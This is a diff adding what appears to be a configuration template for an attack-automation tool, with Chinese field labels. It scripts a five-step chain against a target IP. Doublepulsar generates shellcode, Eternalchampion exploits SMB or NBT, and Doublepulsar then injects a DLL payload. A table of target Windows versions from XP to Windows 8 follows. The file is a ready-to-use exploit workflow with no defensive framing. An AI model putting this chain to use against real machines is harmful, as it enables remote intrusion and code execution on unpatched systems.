@@ -1,0 +1,58 @@
+<sfjt>inject</sfjt>
+<ljfs>NB,NR,MR</ljfs>
+<sctype>dll</sctype>
+<cs1mc>IP地址</cs1mc>
+<cs2mc>端口</cs2mc>
+<cs3mc>攻击服务</cs3mc>
+<cs4mc>系统版本</cs4mc>
+<cs5mc>系统架构</cs5mc>
+<zbz>5</zbz>
+<bz1><cmd>Doublepulsar-1.3.1.exe --NetworkTimeout 60 --TargetIp <cs1/> --TargetPort <cs2/> --Protocol SMB --Architecture <cs5/> --Function OutputInstall --OutputFile 1.bin</cmd></bz1>
+<bz2><cmd>cj.exe</cmd></bz2>
+<bz3><cmd>ping -n 3 127.1 >nul</cmd></bz3>
+<bz4><cmd>Eternalchampion-2.0.0.exe --TargetIp <cs1/> --TargetPort <cs2/> --ShellcodeBuffer <cj/> --Protocol <cs3/> --Target <cs4/></cmd></bz4>
+<bz5><cmd>Doublepulsar-1.3.1.exe --TargetIp <cs1/> --TargetPort 445 --DllPayload <sc/> --Protocol SMB --Architecture <cs5/> --Function Rundll</cmd></bz5>
+
+<bz>             上 下 对 应
+端口：        139   445
+攻击服务：    NBT   SMB
+
+系统架构：    X86   X64
+系统版本：
+   XP_SP0SP1_X86
+         Windows XP Sp0 and Sp1, 32-bit
+   XP_SP2SP3_X86
+         Windows XP Sp2 and Sp3, 32-bit
+   XP_SP1_X64
+         Windows XP Sp1, 64-bit
+   XP_SP2_X64
+         Windows XP Sp2, 64-bit
+   SERVER_2003_SP0
+         Windows Sever 2003 Sp0, 32-bit
+   SERVER_2003_SP1
+         Windows Sever 2003 Sp1, 32-bit/64-bit
+   SERVER_2003_SP2
+         Windows Sever 2003 Sp2, 32-bit/64-bit
+   VISTA_SP0
+         Windows Vista Sp0, 32-bit/64-bit
+   VISTA_SP1
+         Windows Vista Sp1, 32-bit/64-bit
+   VISTA_SP2
+         Windows Vista Sp2, 32-bit/64-bit
+   SERVER_2008_SP0
+         Windows Server 2008 Sp0, 32-bit/64-bit
+   SERVER_2008_SP1
+         Windows Server 2008 Sp1, 32-bit/64-bit
+   SERVER_2008_SP2
+         Windows Server 2008 Sp2, 32-bit/64-bit
+   WIN7_SP0
+         Windows 7 Sp0, 32-bit/64-bit
+   WIN7_SP1
+         Windows 7 Sp1, 32-bit/64-bit
+   SERVER_2008R2_SP0
+         Windows Server 2008 R2 Sp0, 32-bit/64-bit
+   SERVER_2008R2_SP1
+         Windows Server 2008 R2 Sp1, 32-bit/64-bit
+   WIN8_SP0
+         Windows 8 Sp0, 32-bit/64-bit
+</bz>
